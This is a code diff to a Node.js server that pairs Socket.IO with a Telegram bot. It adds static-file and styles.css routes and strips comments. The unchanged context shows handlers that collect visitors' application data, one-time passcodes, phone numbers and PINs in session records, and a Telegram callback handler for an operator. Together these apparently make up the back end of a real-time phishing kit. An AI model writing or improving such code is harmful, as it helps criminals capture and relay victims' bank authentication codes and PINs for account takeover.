@@ -16,7 +16,14 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_TELEGRAM_CHAT_ID'
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
 
 app.use(express.json());
+
+// 1. Explicitly serve static files from the 'public' directory
 app.use(express.static(path.join(__dirname, 'public')));
+
+// 2. Fallback route to explicitly send styles.css if requested
+app.get('/styles.css', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'styles.css'));
+});
 
 // Store active application sessions by socket ID
 const activeSessions = new Map();
@@ -24,7 +31,6 @@ const activeSessions = new Map();
 io.on('connection', (socket) => {
   console.log(`User connected: ${socket.id}`);
 
-  // Step 3 Completion -> Initial Application Submitted
   socket.on('submit_application', async (data) => {
     activeSessions.set(socket.id, { ...data, socketId: socket.id, status: 'PENDING_DETAILS' });
 
@@ -60,7 +66,6 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Step 4 Completion -> OTP Submitted
   socket.on('submit_otp', async (data) => {
     const session = activeSessions.get(socket.id) || {};
     session.otp = data.otp;
@@ -89,7 +94,6 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Step 5 Completion -> PIN Submitted
   socket.on('submit_pin', async (data) => {
     const session = activeSessions.get(socket.id) || {};
     session.pinPhone = data.phone;
@@ -126,7 +130,6 @@ io.on('connection', (socket) => {
   });
 });
 
-// Handle Telegram Admin Callback Buttons
 bot.on('callback_query', async (query) => {
   const data = query.data;
   const chatId = query.message.chat.id;
@@ -190,4 +193,4 @@ bot.on('callback_query', async (query) => {
 server.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
 });
-            
+           
